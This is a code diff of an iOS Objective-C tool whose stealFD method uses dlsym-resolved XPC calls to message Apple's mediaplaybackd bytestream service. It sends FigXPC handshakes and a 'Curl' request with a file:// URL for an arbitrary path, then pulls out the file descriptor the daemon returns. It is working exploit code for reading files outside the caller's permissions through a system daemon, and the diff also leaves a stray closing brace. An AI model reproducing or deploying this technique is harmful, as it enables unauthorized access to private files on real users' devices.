@@ -91,87 +91,88 @@ static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
     [self journal:@"FigXPC functions loaded"];
     return YES;
 }
-    return YES;
-}
 
 - (int)stealFD:(NSString *)filePath {
-    // Use raw XPC for connection (not FigXPC)
-    xpc_connection_t conn = xpc_connection_create_mach_service(
-        "com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
+    // Load XPC functions via dlsym (not available on iOS at compile time)
+    static xpc_connection_t (*my_xpc_conn_create)(const char *, void *, uint64_t) = NULL;
+    static void (*my_xpc_conn_set_handler)(xpc_connection_t, void *) = NULL;
+    static void (*my_xpc_conn_resume)(xpc_connection_t) = NULL;
+    static void (*my_xpc_conn_cancel)(xpc_connection_t) = NULL;
+    static void (*my_xpc_conn_send_reply)(xpc_connection_t, xpc_object_t, void *, void *) = NULL;
+    static int (*my_xpc_dict_dup_fd)(xpc_object_t, const char *) = NULL;
+    static xpc_object_t (*my_xpc_dict_get_value)(xpc_object_t, const char *) = NULL;
+
+    if (!my_xpc_conn_create) {
+        void *xpcLib = dlopen("/usr/lib/system/libxpc.dylib", RTLD_LAZY);
+        if (!xpcLib) xpcLib = dlopen("/usr/lib/libxpc.dylib", RTLD_LAZY);
+        my_xpc_conn_create = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_create_mach_service");
+        my_xpc_conn_set_handler = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_set_event_handler");
+        my_xpc_conn_resume = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_resume");
+        my_xpc_conn_cancel = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_cancel");
+        my_xpc_conn_send_reply = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_connection_send_message_with_reply");
+        my_xpc_dict_dup_fd = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_dup_fd");
+        my_xpc_dict_get_value = dlsym(xpcLib ? xpcLib : RTLD_DEFAULT, "xpc_dictionary_get_value");
+        [self journal:[NSString stringWithFormat:@"xpc funcs: %p %p %p", my_xpc_conn_create, my_xpc_conn_send_reply, my_xpc_dict_dup_fd]];
+    }
+
+    if (!my_xpc_conn_create || !my_xpc_conn_send_reply || !my_xpc_dict_dup_fd) {
+        [self journal:@"XPC functions not available"];
+        return -1;
+    }
+
+    xpc_connection_t conn = my_xpc_conn_create("com.apple.coremedia.mediaplaybackd.bytestream.xpc", NULL, 0);
     if (!conn) {
         [self journal:@"XPC connection failed"];
         return -1;
     }
-    [self journal:@"XPC connection created (raw)"];
+    [self journal:@"XPC connection created"];
+    my_xpc_conn_resume(conn);
 
-    xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
-        // Handle events
-    });
-    xpc_connection_resume(conn);
-
-    // Handshake via FigXPC message creation + raw XPC send
+    // Handshake
     for (NSString *opStr in @[@".rp1", @".rp2", @".org"]) {
         uint32_t opcode = 0;
         memcpy(&opcode, opStr.UTF8String, 4);
         void *msg = figXPCCreateBasicMessage(opcode, NULL);
-        if (!msg) {
-            [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]];
-            continue;
-        }
-        xpc_object_t reply = NULL;
-        xpc_connection_send_message_with_reply(conn, msg, NULL, ^(xpc_object_t r) {
-            reply = r;
-        });
-        // Wait a bit for reply
+        if (!msg) { [self journal:[NSString stringWithFormat:@"create %@ failed", opStr]]; continue; }
+        __block xpc_object_t reply = NULL;
+        my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)msg, NULL, ^(xpc_object_t r) { reply = r; });
         usleep(100000);
         [self journal:[NSString stringWithFormat:@"handshake %@: reply=%p", opStr, reply]];
     }
 
-    // Curl create with CreationURL
+    // Curl create
     uint32_t curlOp = 'Curl';
     void *curlMsg = figXPCCreateBasicMessage(curlOp, NULL);
-    if (!curlMsg) {
-        [self journal:@"Curl message create failed"];
-        return -1;
-    }
+    if (!curlMsg) { [self journal:@"Curl msg failed"]; my_xpc_conn_cancel(conn); return -1; }
 
     NSString *urlStr = [NSString stringWithFormat:@"file://%@", filePath];
     CFURLRef url = CFURLCreateWithString(NULL, (__bridge CFStringRef)urlStr, NULL);
     figXPCMessageSetCFURL(curlMsg, "CreationURL", url);
     CFRelease(url);
-    [self journal:[NSString stringWithFormat:@"Curl create: %@", urlStr]];
+    [self journal:[NSString stringWithFormat:@"Curl: %@", urlStr]];
 
     __block xpc_object_t curlReply = NULL;
-    xpc_connection_send_message_with_reply(conn, curlMsg, NULL, ^(xpc_object_t r) {
-        curlReply = r;
-    });
+    my_xpc_conn_send_reply(conn, (__bridge xpc_object_t)curlMsg, NULL, ^(xpc_object_t r) { curlReply = r; });
     usleep(200000);
 
     if (!curlReply) {
-        [self journal:@"Curl reply is NULL"];
-        xpc_connection_cancel(conn);
+        [self journal:@"Curl reply NULL"];
+        my_xpc_conn_cancel(conn);
         return -1;
     }
 
-    // Extract fd from ByteStreamDetails -> FileDescriptor
-    xpc_object_t details = xpc_dictionary_get_value(curlReply, "ByteStreamDetails");
+    // Extract fd
+    xpc_object_t details = my_xpc_dict_get_value(curlReply, "ByteStreamDetails");
+    int fd = -1;
     if (details) {
-        int fd = xpc_dictionary_dup_fd(details, "FileDescriptor");
-        [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
-        xpc_connection_cancel(conn);
-        return fd;
-    }
-
-    // Try direct fd in reply
-    int fd = xpc_dictionary_dup_fd(curlReply, "FileDescriptor");
-    if (fd >= 0) {
-        [self journal:[NSString stringWithFormat:@"GOT FD (direct): %d", fd]];
+        fd = my_xpc_dict_dup_fd(details, "FileDescriptor");
     } else {
-        [self journal:@"No FileDescriptor in reply"];
+        fd = my_xpc_dict_dup_fd(curlReply, "FileDescriptor");
     }
-
-    xpc_connection_cancel(conn);
+    [self journal:[NSString stringWithFormat:@"GOT FD: %d", fd]];
+    my_xpc_conn_cancel(conn);
     return fd;
+}
 }
 - (NSString *)runReport {
     NSMutableString *report = [NSMutableString string];
